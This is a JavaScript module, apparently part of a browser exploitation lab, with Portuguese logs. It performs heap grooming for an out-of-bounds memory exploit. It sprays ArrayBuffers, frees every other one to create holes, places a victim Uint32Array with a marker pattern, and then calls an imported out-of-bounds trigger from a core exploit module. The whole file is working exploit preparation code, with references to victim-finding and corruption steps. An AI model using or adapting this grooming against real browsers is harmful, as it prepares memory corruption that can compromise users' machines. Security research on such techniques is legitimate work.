// js/heap_groomer.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs';
import { updateOOBConfigFromUI, OOB_CONFIG } from './config.mjs';
import * as Core from './core_exploit.mjs'; // Importa Core para limpar buffer OOB se necessário

export let victim_object = null;
export let victim_object_type = 'TypedArray';
let spray_array_temp = [];

const FNAME_BASE_GROOMER = "HeapGroomer";

export async function prepareVictim(object_size_str) {
    const FNAME_PREP_VICTIM = `${FNAME_BASE_GROOMER}.prepareVictim`;
    victim_object = null;
    const object_size = parseInt(object_size_str);

    appLog(`Tentando preparar vítima com object_size: ${object_size_str} -> ${object_size}`, "info", FNAME_PREP_VICTIM);

    if (isNaN(object_size) || object_size <= 0) {
        appLog(`ERRO CRÍTICO: Tamanho do objeto (${object_size_str}) é inválido.`, "error", FNAME_PREP_VICTIM);
        return false;
    }
    if (object_size % 4 !== 0) {
        appLog(`AVISO: Tamanho do objeto (${object_size}) não é múltiplo de 4. Pode não ser ideal para Uint32Array.`, "warn", FNAME_PREP_VICTIM);
    }

    const victim_typed_array_elements = Math.floor(object_size / 4);
    if (victim_typed_array_elements <= 0 && object_size > 0) {
         appLog(`ERRO CRÍTICO: Número de elementos calculado para Uint32Array é zero ou negativo (${victim_typed_array_elements}) para object_size ${object_size}.`, "error", FNAME_PREP_VICTIM);
        return false;
    }

    try {
        victim_object = new Uint32Array(victim_typed_array_elements);
        victim_object_type = 'Uint32Array';
        for(let i=0; i < victim_object.length; i++) {
            victim_object[i] = (0xBB000000 | i) ;
        }
        appLog(`Vítima (${victim_object_type}, ${victim_object.length} elems, ${victim_object.byteLength}b) alocada. Padrão: 0xBB00xxxx`, 'good', FNAME_PREP_VICTIM);
        return true;
    } catch (e) {
        appLog(`ERRO ao alocar objeto vítima: ${e.message}`, "error", FNAME_PREP_VICTIM);
        victim_object = null;
        return false;
    }
}

export async function groomHeapExperimental(spray_count = 100, target_object_size = 288, intermediate_alloc_count = 20) {
    const FNAME_GROOM = `${FNAME_BASE_GROOMER}.groomHeapExperimental`;
    appLog(`--- Iniciando Heap Grooming Experimental ---`, "test", FNAME_GROOM);
    appLog(`   Parâmetros Recebidos: spray_count=${spray_count}, target_object_size=${target_object_size}, intermediate_allocs=${intermediate_alloc_count}`, "info", FNAME_GROOM);
    updateOOBConfigFromUI();

    spray_array_temp = [];

    const spray_obj_size = target_object_size + 16;
    appLog(`   Fase 1: Spray com ${spray_count} objetos de ${spray_obj_size} bytes...`, "info", FNAME_GROOM);
    for (let i = 0; i < spray_count; i++) {
        try {
            spray_array_temp.push(new ArrayBuffer(spray_obj_size));
        } catch (e) {
            appLog(`Erro durante spray na iteração ${i}: ${e.message}. Parando spray.`, "warn", FNAME_GROOM);
            break;
        }
        if (i % 100 === 0 && i > 0) await PAUSE_LAB(10);
    }
    appLog(`   Fase 1: Spray concluído. ${spray_array_temp.length} objetos no array de spray.`, "info", FNAME_GROOM);

    const num_holes_to_create = Math.floor(Math.min(spray_array_temp.length / 2, intermediate_alloc_count)); // Não cria mais buracos que o especificado ou possível
    appLog(`   Fase 2: Tentando criar ${num_holes_to_create} buracos (desalocando objetos de spray)...`, "info", FNAME_GROOM);
    let holes_created_count = 0;
    for (let i = 0; i < spray_array_temp.length && holes_created_count < num_holes_to_create; i += 2) {
        spray_array_temp[i] = null;
        holes_created_count++;
    }
    spray_array_temp = spray_array_temp.filter(item => item !== null);
    appLog(`   Fase 2: ${holes_created_count} referências removidas. ${spray_array_temp.length} objetos de spray restantes.`, "info", FNAME_GROOM);

    appLog(`   Fase 3: Tentando alocar vítima e buffer OOB...`, "info", FNAME_GROOM);
    victim_object = null;
    if (Core.oob_array_buffer_real) {
        Core.oob_array_buffer_real = null;
        Core.oob_dataview_real = null;
        appLog("     Buffer OOB anterior conceitualmente limpo (referências removidas).", "info", FNAME_GROOM);
    }

    if (target_object_size > 0) {
        await prepareVictim(String(target_object_size));
    } else {
        appLog("     Tamanho do objeto alvo inválido, não preparando vítima JS.", "warn", FNAME_GROOM);
    }

    if (OOB_CONFIG.ALLOCATION_SIZE !== target_object_size) {
        appLog(`     AVISO: OOB_CONFIG.ALLOCATION_SIZE (${OOB_CONFIG.ALLOCATION_SIZE}) é diferente do target_object_size (${target_object_size}) do grooming.`, "warn", FNAME_GROOM);
    }
    await Core.triggerOOB_primitive();

    appLog(`--- Heap Grooming Experimental Concluído ---`, "test", FNAME_GROOM);
    appLog(`   Verifique o log e tente usar o VictimFinder ou o VictimCorruptor agora.`, "info", FNAME_GROOM);
}

export async function groomHeapButtonHandler() {
    const FNAME_HANDLER = `${FNAME_BASE_GROOMER}.Handler`;
    appLog(`[${FNAME_HANDLER}] Botão 'Executar Grooming Experimental' clicado.`, "info", FNAME_HANDLER);

    const sprayCountEl = document.getElementById('groomSprayCount');
    const targetSizeEl = document.getElementById('groomTargetObjectSize');
    const interAllocsEl = document.getElementById('groomIntermediateAllocs');

    let spray_count = 200; // Default
    let target_object_size; // Será definido abaixo
    let intermediate_alloc_count = 50; // Default

    if (sprayCountEl && sprayCountEl.value.trim() !== "") {
        const val = parseInt(sprayCountEl.value, 10);
        if (!isNaN(val) && val > 0) spray_count = val;
        else appLog(`Valor de Contagem de Spray '${sprayCountEl.value}' inválido. Usando padrão: ${spray_count}`, "warn", FNAME_HANDLER);
    } else {
        appLog(`Contagem de Spray não especificada. Usando padrão: ${spray_count}`, "info", FNAME_HANDLER);
    }

    // Garante que OOB_CONFIG está atualizado antes de usar como fallback.
    updateOOBConfigFromUI();

    if (targetSizeEl && targetSizeEl.value.trim() !== "") {
        const val = parseInt(targetSizeEl.value, 10);
        if (!isNaN(val) && val > 0) {
            target_object_size = val;
        } else {
            appLog(`Tamanho do Objeto Alvo para grooming '${targetSizeEl.value}' inválido. Usando OOB_CONFIG.ALLOCATION_SIZE: ${OOB_CONFIG.ALLOCATION_SIZE}`, "warn", FNAME_HANDLER);
            target_object_size = OOB_CONFIG.ALLOCATION_SIZE;
        }
    } else {
        target_object_size = OOB_CONFIG.ALLOCATION_SIZE;
        appLog(`Tamanho do Objeto Alvo para grooming não especificado. Usando OOB_CONFIG.ALLOCATION_SIZE: ${target_object_size}`, "info", FNAME_HANDLER);
    }
     // Garante que o tamanho alvo do grooming não seja zero se OOB_CONFIG.ALLOCATION_SIZE for zero.
    if (target_object_size <= 0) {
        target_object_size = 288; // Um fallback final seguro
        appLog(`Tamanho do Objeto Alvo para grooming resultou em <=0. Usando fallback seguro: ${target_object_size}`, "warn", FNAME_HANDLER);
    }


    if (interAllocsEl && interAllocsEl.value.trim() !== "") {
        const val = parseInt(interAllocsEl.value, 10);
        if (!isNaN(val) && val >= 0) intermediate_alloc_count = val;
        else appLog(`Valor de Alocações Intermediárias '${interAllocsEl.value}' inválido. Usando padrão: ${intermediate_alloc_count}`, "warn", FNAME_HANDLER);
    } else {
        appLog(`Alocações Intermediárias não especificadas. Usando padrão: ${intermediate_alloc_count}`, "info", FNAME_HANDLER);
    }

    appLog(`Parâmetros para groomHeapExperimental: spray=${spray_count}, target_size=${target_object_size}, inter_allocs=${intermediate_alloc_count}`, "info", FNAME_HANDLER);
    await groomHeapExperimental(spray_count, target_object_size, intermediate_alloc_count);
}
